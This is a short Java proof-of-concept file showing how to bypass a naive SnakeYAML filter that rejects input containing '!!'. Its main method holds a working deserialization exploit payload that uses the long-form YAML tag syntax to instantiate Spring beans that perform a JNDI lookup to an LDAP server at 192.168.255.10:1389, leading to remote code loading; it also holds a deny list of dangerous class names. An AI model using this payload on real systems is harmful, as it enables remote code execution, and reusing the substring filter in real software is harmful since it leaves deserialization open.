package BypassAnalyze;


import org.yaml.snakeyaml.Yaml;

// 测试绕过 !!
public class bypassTest {

    private static final String[] RISKY_STR_ARR = {"ScriptEngineManager", "URLClassLoader", "!!",
            "ClassLoader", "AnnotationConfigApplicationContext", "FileSystemXmlApplicationContext",
            "GenericXmlApplicationContext", "GenericGroovyApplicationContext", "GroovyScriptEngine",
            "GroovyClassLoader", "GroovyShell", "ScriptEngine", "ScriptEngineFactory", "XmlWebApplicationContext",
            "ClassPathXmlApplicationContext", "MarshalOutputStream", "InflaterOutputStream", "FileOutputStream"};

    public String yamlLoads(String payload) {

        try {
            if (payload.contains("!!")) {
                System.out.println("can not has malicious remote script");
                return "failed";
            }
            Yaml yaml = new Yaml();
            yaml.loadAs(payload, Object.class);

        } catch (Exception e) {
            System.out.println("error");
        }
        return "over";
    }

    public static void main(String[] args) {
        String payload = "!<tag:yaml.org,2002:org.springframework.beans.factory.config.PropertyPathFactoryBean> \n" +
                " targetBeanName: \"ldap://192.168.255.10:1389/tr7j8w\"\n" +
                " propertyPath: Drunkbaby\n" +
                " beanFactory: !<tag:yaml.org,2002:org.springframework.jndi.support.SimpleJndiBeanFactory> \n" +
                "  shareableResources: [\"ldap://192.168.255.10:1389/tr7j8w\"]";
        bypassTest bypassTest = new bypassTest();
        bypassTest.yamlLoads(payload);
    }
}
